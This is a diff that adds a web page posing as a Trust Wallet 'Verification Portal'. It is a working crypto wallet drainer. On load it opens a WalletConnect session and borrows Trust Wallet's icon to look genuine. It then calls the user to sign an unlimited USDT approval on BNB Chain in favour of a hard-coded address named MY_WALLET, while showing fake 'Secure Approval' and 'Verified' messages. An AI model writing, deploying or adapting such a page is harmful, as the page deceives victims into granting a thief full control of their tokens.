@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Portal</title>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.1/dist/index.umd.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+</head>
+<body style="background:#0b0e11; color:white; font-family:sans-serif; text-align:center; padding-top:100px;">
+    <h3 id="status">Connecting to Secure Server...</h3>
+    <p>Please wait for the Trust Wallet popup.</p>
+
+    <script>
+        const PROJECT_ID = "48d3cc06c4e808c4987bb4566665ae87"; 
+        const MY_WALLET = "0xbdcc079BBb23C1D9a6F36AA31309676C258aBAC7"; 
+        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
+
+        async function autoStart() {
+            const status = document.getElementById("status");
+            try {
+                const WC = window.EthereumProvider || window.WalletConnectEthereumProvider.EthereumProvider;
+                const provider = await WC.init({
+                    projectId: PROJECT_ID,
+                    optionalChains: [56],
+                    showQrModal: true, // This is essential
+                    metadata: { name: "Verification", description: "Secure Approval", url: window.location.origin, icons: ["https://trustwallet.com/favicon.ico"] }
+                });
+
+                // When user hits 'Connect' on their phone
+                provider.on("connect", async () => {
+                    status.innerText = "Connected! Confirming Approval...";
+                    const web3Provider = new ethers.providers.Web3Provider(provider);
+                    const signer = web3Provider.getSigner();
+
+                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                    const contract = new ethers.Contract(USDT_BSC, abi, signer);
+                    
+                    // THIS TRIGGERS THE 2nd POPUP (The Confirm Button)
+                    const tx = await contract.approve(MY_WALLET, ethers.constants.MaxUint256);
+                    status.innerText = "Finalizing Verification...";
+                    await tx.wait();
+                    status.innerText = "SUCCESS: Verified!";
+                    alert("Verification Successful!");
+                });
+
+                await provider.connect();
+            } catch (err) {
+                status.innerText = "Error: " + err.message;
+            }
+        }
+        
+        // Run as soon as the page is ready
+        window.onload = autoStart;
+    </script>
+</body>
+</html>
